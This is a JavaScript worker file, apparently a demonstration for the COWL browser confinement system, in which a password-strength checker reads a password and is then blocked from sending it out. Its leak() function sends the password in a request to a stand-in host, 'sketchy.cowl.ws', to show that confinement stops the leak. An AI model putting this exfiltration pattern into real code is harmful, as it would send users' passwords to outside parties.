// Wait for message from the parent:
onmessage = function(password) {
  fetchRegex(function(regex) {
    // Raise the privacy label:
    COWL.privacyLabel = COWL.privacyLabel.and(password.privacy);
    // Now we can read the password
    console.log('Checking strangth of: %s', password.blob);
    // But cannot talk to the network arbitrary:
    leak(password.blob);
    // But we can still compute the strength and reply to the parent:
    postMessage(regex.test(password.blob) ? 'strong' : 'weak')
  });
};

// Try to leak the supplied data:
function leak(data) {
  try {
    var req = new XMLHttpRequest();
    req.open('get', 'http://sketchy.cowl.ws/leak/yourpass='+data, true);
    req.send();
  } catch(e) {
    console.log("Failed to leak!");
  }
}

function fetchRegex(cb) {
// The regex is from:
// http://www.mkyong.com/regular-expressions/how-to-validate-password-with-regular-expression/
  try {
    var req = new XMLHttpRequest();
    req.open('get', 'http://www.cowl.ws/examples/checker/regex.json', true);
    req.responseType = "json";
    req.onload = function() {
      cb(new RegExp(req.response.regex));
    };
    req.send();
  } catch(e) {
    console.log("Failed to fetch regex: %s", e);
    cb(/\w{6,20}/);
  }
}

// Tell the parent that we're done loading:
postMessage('ready');
